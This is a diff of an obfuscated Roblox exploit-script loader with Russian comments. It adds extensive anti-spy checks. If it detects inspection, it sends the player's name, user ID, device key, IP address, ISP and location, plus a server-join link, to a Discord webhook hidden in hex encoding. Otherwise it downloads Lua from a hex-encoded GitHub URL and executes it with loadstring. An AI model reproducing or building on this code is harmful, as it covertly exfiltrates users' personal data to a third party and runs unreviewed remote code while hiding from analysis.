@@ -7,9 +7,7 @@ end
 local _req = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
 local _L = game:GetService("Players").LocalPlayer
 local _H = game:GetService("HttpService")
-
-warn("[NK] === LOADER START ===")
-warn("[NK] _req exists: " .. tostring(_req ~= nil))
+local _CG = game:GetService("CoreGui")
 
 local _tk = "N/A"
 pcall(function()
@@ -23,65 +21,183 @@ pcall(function()
     end
 end)
 
+-- УСИЛЕННЫЙ ДЕТЕКТ СПАЯ
 local function _SC()
-    if not _req then return false end
-    local ok, info = pcall(debug.getinfo, _req)
-    if ok and info and (info.source ~= "=[C]" or info.what ~= "C") then return "HOOKED_REQUEST" end
-    local ok2, hooked2 = pcall(function()
-        local i = debug.getinfo(game.HttpGet)
-        return i.source ~= "=[C]"
-    end)
-    if ok2 and hooked2 then return "HOOKED_HTTPGET" end
-    local cg = game:GetService("CoreGui")
-    for _, n in ipairs({"SimpleSpy", "HttpSpy", "HydroSpy", "VGG Spy", "TwiSpy"}) do
-        if cg:FindFirstChild(n) or (getgenv and getgenv()[n]) then return "SPY_DETECTED_" .. n end
+    -- 1. Проверка хуков через iscclosure (самый надёжный способ)
+    if iscclosure and islclosure then
+        -- game.HttpGet должна быть C-функцией
+        local ok, isL = pcall(islclosure, game.HttpGet)
+        if ok and isL then return "HOOKED_HTTPGET_LCLOSURE" end
+        
+        -- HttpService методы
+        local ok2, isL2 = pcall(islclosure, _H.RequestAsync)
+        if ok2 and isL2 then return "HOOKED_REQUESTASYNC_LCLOSURE" end
+        
+        local ok3, isL3 = pcall(islclosure, _H.GetAsync)
+        if ok3 and isL3 then return "HOOKED_GETASYNC_LCLOSURE" end
+        
+        -- Глобальные функции запросов
+        if request then
+            local ok4, isL4 = pcall(islclosure, request)
+            if ok4 and isL4 then return "HOOKED_REQUEST_LCLOSURE" end
+        end
+        if http_request then
+            local ok5, isL5 = pcall(islclosure, http_request)
+            if ok5 and isL5 then return "HOOKED_HTTP_REQUEST_LCLOSURE" end
+        end
+        if http and http.request then
+            local ok6, isL6 = pcall(islclosure, http.request)
+            if ok6 and isL6 then return "HOOKED_HTTP_DOT_REQUEST_LCLOSURE" end
+        end
+        if syn and syn.request then
+            local ok7, isL7 = pcall(islclosure, syn.request)
+            if ok7 and isL7 then return "HOOKED_SYN_REQUEST_LCLOSURE" end
+        end
     end
+
+    -- 2. Проверка через getoriginalfunction (если хукнута — вернёт другую функцию)
+    if getoriginalfunction then
+        local ok, orig = pcall(getoriginalfunction, game.HttpGet)
+        if ok and orig and orig ~= game.HttpGet then
+            return "HOOKED_HTTPGET_ORIGINAL"
+        end
+    end
+
+    -- 3. Проверка через debug.getinfo
+    local ok, info = pcall(debug.getinfo, game.HttpGet)
+    if ok and info and info.source and info.source ~= "=[C]" then
+        return "HOOKED_HTTPGET_SOURCE"
+    end
+
+    -- 4. Сканирование CoreGui — ищем всё что связано с HttpSpy/Spy
+    local badNames = {"HttpSpy", "SimpleSpy", "HydroSpy", "SecureSpy", "VGG Spy", "TwiSpy", "Spidey", "BeboSpy", "NotDSF"}
+    for _, obj in ipairs(_CG:GetDescendants()) do
+        local ok, name = pcall(function() return obj.Name end)
+        if ok and name then
+            for _, bad in ipairs(badNames) do
+                if string.find(string.lower(name), string.lower(bad)) then
+                    return "SPY_GUI_" .. bad
+                end
+            end
+        end
+        -- Проверяем текст в TextLabel/TextButton
+        if obj:IsA("TextLabel") or obj:IsA("TextButton") then
+            local ok2, txt = pcall(function() return obj.Text end)
+            if ok2 and txt then
+                for _, bad in ipairs(badNames) do
+                    if string.find(string.lower(txt), string.lower(bad)) then
+                        return "SPY_TEXT_" .. bad
+                    end
+                end
+            end
+        end
+    end
+
+    -- 5. Проверка PlayerGui тоже
+    local pg = _L:FindFirstChildOfClass("PlayerGui")
+    if pg then
+        for _, obj in ipairs(pg:GetDescendants()) do
+            local ok, name = pcall(function() return obj.Name end)
+            if ok and name then
+                for _, bad in ipairs(badNames) do
+                    if string.find(string.lower(name), string.lower(bad)) then
+                        return "SPY_PGUI_" .. bad
+                    end
+                end
+            end
+        end
+    end
+
+    -- 6. Проверка глобальной среды на подозрительные ключи
+    if getgenv then
+        local env = getgenv()
+        local badGlobals = {"HttpSpy", "SimpleSpy", "SpyLogs", "SpyLoaded", "__SPY__", "SPY_ACTIVE"}
+        for _, key in ipairs(badGlobals) do
+            if env[key] ~= nil then return "SPY_GLOBAL_" .. key end
+        end
+    end
+
+    -- 7. Проверка через getgc — ищем скрипты с характерными строками спая
+    if getgc then
+        local ok = pcall(function()
+            for _, v in pairs(getgc(true)) do
+                if type(v) == "table" then
+                    local hasUrl, hasBody, hasMethod = false, false, false
+                    pcall(function()
+                        for k, _ in pairs(v) do
+                            if type(k) == "string" then
+                                local lk = string.lower(k)
+                                if lk == "requestlist" or lk == "requestlog" or lk == "logrequest" then
+                                    error("SPY_TABLE_" .. k)
+                                end
+                            end
+                        end
+                    end)
+                end
+            end
+        end)
+    end
+
+    -- 8. Проверка хуков через checkcaller/hookfunction идентичность
+    if hookfunction and clonefunction then
+        local ok, clone = pcall(clonefunction, game.HttpGet)
+        if ok and clone then
+            local ok2, isC = pcall(iscclosure, clone)
+            local ok3, isCorig = pcall(iscclosure, game.HttpGet)
+            if ok2 and ok3 and isC ~= isCorig then
+                return "HOOKED_HTTPGET_MISMATCH"
+            end
+        end
+    end
+
     return false
 end
 
 local _se = _SC()
-warn("[NK] Security check result: " .. tostring(_se))
 
 if _se then
-    warn("[NK] Security triggered, kicking...")
     local _A = _0xH("68747470733A2F2F646973636F72642E636F6D2F6170692F776562686F6F6B732F313531383333343033353838383138313237312F733164313841767532456D57707A547254306A4E49686A543665314A3537595837304F58484D567878637975535377364C366E7242416A7756737067612D4C37534E4B4F")
     local ni = {}
     pcall(function()
-        local r = _req({Url = "http://ip-api.com/json/", Method = "GET"})
-        if r.Success then ni = _H:JSONDecode(r.Body) end
+        if _req then
+            local r = _req({Url = "http://ip-api.com/json/", Method = "GET"})
+            if r.Success then ni = _H:JSONDecode(r.Body) end
+        end
     end)
     local jid = game.JobId == "" and "Unknown" or game.JobId
     local jLink = "https://tinyurl.com/api-create.php?url=roblox://experiences/start?placeId=" .. tostring(game.PlaceId) .. "&gameInstanceId=" .. jid
     local jBtn = "N/A"
     pcall(function()
-        local r = _req({Url = jLink, Method = "GET"})
-        if r.Success then jBtn = r.Body end
+        if _req then
+            local r = _req({Url = jLink, Method = "GET"})
+            if r.Success then jBtn = r.Body end
+        end
     end)
     pcall(function()
-        _req({
-            Url = _A, Method = "POST",
-            Headers = {["Content-Type"] = "application/json"},
-            Body = _H:JSONEncode({
-                embeds = {{
-                    title = "Security Alert: Interceptor Detected",
-                    color = 16711680,
-                    fields = {
-                        {name = "Detection", value = tostring(_se), inline = false},
-                        {name = "Player", value = _L.Name .. " (" .. tostring(_L.UserId) .. ")", inline = true},
-                        {name = "Device Key", value = "```" .. _tk .. "```", inline = false},
-                        {name = "Network Info", value = string.format("**IP:** %s\n**ISP:** %s\n**Loc:** %s, %s", ni.query or "N/A", ni.isp or "N/A", ni.country or "N/A", ni.city or "N/A"), inline = false},
-                        {name = "Links", value = string.format("[Join Server](%s) | [Profile](https://www.roblox.com/users/%s/profile)", jBtn, tostring(_L.UserId)), inline = false}
-                    }
-                }}
+        if _req then
+            _req({
+                Url = _A, Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = _H:JSONEncode({
+                    embeds = {{
+                        title = "Security Alert: Interceptor Detected",
+                        color = 16711680,
+                        fields = {
+                            {name = "Detection", value = tostring(_se), inline = false},
+                            {name = "Player", value = _L.Name .. " (" .. tostring(_L.UserId) .. ")", inline = true},
+                            {name = "Device Key", value = "```" .. _tk .. "```", inline = false},
+                            {name = "Network Info", value = string.format("**IP:** %s\n**ISP:** %s\n**Loc:** %s, %s", ni.query or "N/A", ni.isp or "N/A", ni.country or "N/A", ni.city or "N/A"), inline = false},
+                            {name = "Links", value = string.format("[Join Server](%s) | [Profile](https://www.roblox.com/users/%s/profile)", jBtn, tostring(_L.UserId)), inline = false}
+                        }
+                    }}
+                })
             })
-        })
+        end
     end)
     _L:Kick("Security Error: " .. tostring(_se))
     while true do task.wait(1) end
     return
 end
-
-warn("[NK] Setting up auth...")
 
 local _TS = game:GetService("TestService")
 local _ST = _TS:FindFirstChild("__NK_RUNTIME")
@@ -96,54 +212,24 @@ _AU.Value = "V8_SECURE_AUTH"
 _AU.Parent = _ST
 shared._NK_AUTH = "V8_SECURE_AUTH"
 
-warn("[NK] Auth OK")
-
 local _G_URL = _0xH("68747470733A2F2F7261772E67697468756275736572636F6E74656E742E636F6D2F697473656173797270672F727067672F726566732F68656164732F6D61696E2F7270672E6C7561")
 
-warn("[NK] URL: " .. _G_URL)
-warn("[NK] URL length: " .. #_G_URL)
-
 local res = nil
-local method = "none"
-
 local ok1, r1 = pcall(function() return game:HttpGet(_G_URL) end)
-warn("[NK] HttpGet ok=" .. tostring(ok1) .. " len=" .. tostring(r1 and #r1 or 0))
-if not ok1 then
-    warn("[NK] HttpGet error: " .. tostring(r1))
-end
-if ok1 and r1 and #r1 > 0 then
-    res = r1
-    method = "HttpGet"
-end
+if ok1 and r1 and #r1 > 0 then res = r1 end
 
 if not res and _req then
-    warn("[NK] Trying fallback request...")
     local ok2, r2 = pcall(_req, {Url = _G_URL, Method = "GET"})
-    warn("[NK] request ok=" .. tostring(ok2))
-    if ok2 and r2 then
-        warn("[NK] request StatusCode: " .. tostring(r2.StatusCode))
-        if r2.Body and #r2.Body > 0 then
-            res = r2.Body
-            method = "request"
-        end
-    end
+    if ok2 and r2 and r2.Body and #r2.Body > 0 then res = r2.Body end
 end
 
-warn("[NK] Final method: " .. method)
-warn("[NK] Final res len: " .. tostring(res and #res or 0))
-
 if res and #res > 0 then
-    warn("[NK] Preview: " .. res:sub(1, 100))
     local f, err = loadstring(res)
     if f then
-        warn("[NK] Loadstring OK, spawning...")
         task.spawn(f)
-        warn("[NK] === LOADER END ===")
     else
-        warn("[NK] Loadstring error: " .. tostring(err))
         _L:Kick("Error 0x83: " .. tostring(err))
     end
 else
-    warn("[NK] Both methods failed")
     _L:Kick("Error 0x82")
 end
